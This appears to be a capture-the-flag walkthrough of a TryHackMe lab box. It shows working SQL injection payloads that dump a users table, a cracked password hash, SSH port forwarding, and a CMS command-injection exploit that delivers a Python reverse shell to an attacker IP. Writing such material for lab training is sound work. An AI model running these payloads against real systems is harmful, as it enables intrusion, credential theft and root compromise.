Only two ports are available: `ssh` and `http`.

Open the <ip> in the browser and check the content on port `80`.

## Exploitation

I used `' or 1=1#` to bypass the login form.  
After that, you will be redirected to the `/portal.php` page with a single search bar.  
The official guide is recommending you use `SQLMap` here, but I'm doing this room to prepare myself for the upcoming `OSCP`.  
`SQLMap` is banned on the `OSCP`, plus you can use the `Metasploit` only once. That's why most of my writeups here are using mostly manuals ways to exploit the target.  
You can read about the manual way of `SQLi` [here](https://portswigger.net/web-security/sql-injection/union-attacks), but I'll shrink it down to the key points applicable for this box.  

We got some data back if we are trying the syntax of a basic `UNION` injection:

```
' UNION SELECT 1,2,3#
```
First, we need to know what's inside the DB. We can check `INFORMATION_SCHEMA` for that:  
```
' UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3#
```
As an output we got the list of schemas. `information_schema,db,mysql,performance_schema,sys`  
We are interested in `db` at the first place.  
Let's check what tables can we find inside of a `db`:  
```
' UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'db'),3#
```
There are only two tables `post` and `users`. `Users` sounds more like juicy stuff, let's dig in a bit more and extract a column of it:  
```
' UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'),3#
```
The output: `username,pwd,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS`
Sweet, so there are `username` and `pwd`! Let's extract them:  

```
' UNION SELECT 1,(select username from db.users),3#

agent47
```
and
```
' UNION SELECT 1,(select pwd from db.users),3#

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```
We got credentials! Well, it's still a hash and we have to crack it.  

[JohnTheReaper](https://github.com/openwall/john) can help with that.  

```
/usr/sbin/john -w=/usr/share/wordlists/rockyou.txt ./john.hash --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***********    (agent47)
1g 0:00:00:00 DONE (2020-10-16 04:10) 2.325g/s 6782Kp/s 6782Kc/s 6782KC/s vimivi..veluca
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

The password is redacted due to THM's rule about writeups.  

Now, when you have both username and password you can connect to the machine via `ssh`.  

## PrivEsc
Privilege escalation is very tricky here.  
First, you can check what is running on the machine. This part is nicely described in the official guide, so I will quickly go through it:  

```
agent47@gamezone:~$ ss -tulpn
```
We can see that a service running on port 10000 is blocked via a firewall rule from the outside, so we can't interact with it directly.  
However, we can use `ssh tunneling` to forward this service to some port in our `Kali Linux` machine:  
```
ssh -L 10000:localhost:10000 agent47@<ip>
```
Now if you will navigate to the `localhost:10000` on your `Kali Linux` you will find something new there - the login page for admin section of this site.  
Plus, you already have the credentials! *wink*  

From here, we can find out the name and the version of the CMS.  
The thing is, that if you will check available exploits for this CMS, you will actually find a few, but both of them are `Metasploit` modules.  
Again, my initial goal here is to avoid automated tools.  
Frankly speaking, this one took me a while to figure out.  
As you might guess, we will not 'use' the [exploit](https://www.exploit-db.com/exploits/21851) itself, but I will use the vulnerability described there.  

This is a snippet of the most interesting part from it:

```
res = send_request_cgi(
			{
				'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
				'cookie'  => "sid=#{session}"
			}, 25)
```
Long story short, we can specify the put a random text there, add the `|` symbol, and put our payload there with another `|` at the end.  
If your goal is the flag, you can do something like  
```
http://localhost:10000/file/show.cgi/show.cgi/bin/AAAA|cat%20/root/root.txt|
```
And get your flag.  
But! Our goals here might be different, but I prefer to look at this as on a penetration test, and not a CTF even.  

> SHELL > flag

Let's spawn a shell, then!  

You have access to the system, so you can save you some time with commands like `which python`, `which perl`, etc. You can also check if the flavor of the `nc` supports `-e` flag or not.  

To get the shell I used a command from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for `python`

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
as you will throw it to the browser, don't forget to `URL-encode` all the things:

```
python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.11.19.53%22%2C1337%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27
```

Open up a listener for your port, you can use something fancy as `1337` if you want to and trigger your `root` shell:
```
localhost:10000/file/show.cgi/show.cgi/bin/AAAA|python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.11.19.53%22%2C1337%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27|
```

VoilÃ ! There you go.

## Takeaway
- I hate `SQLi` too, but you have to learn it to not always blindly rely on your tools
- `Metasploit` is fine, it is well tested, it is rich, etc. But make sure that you can read and understand the code behind it.
- SHELLS > FLAGS! PERIOD!
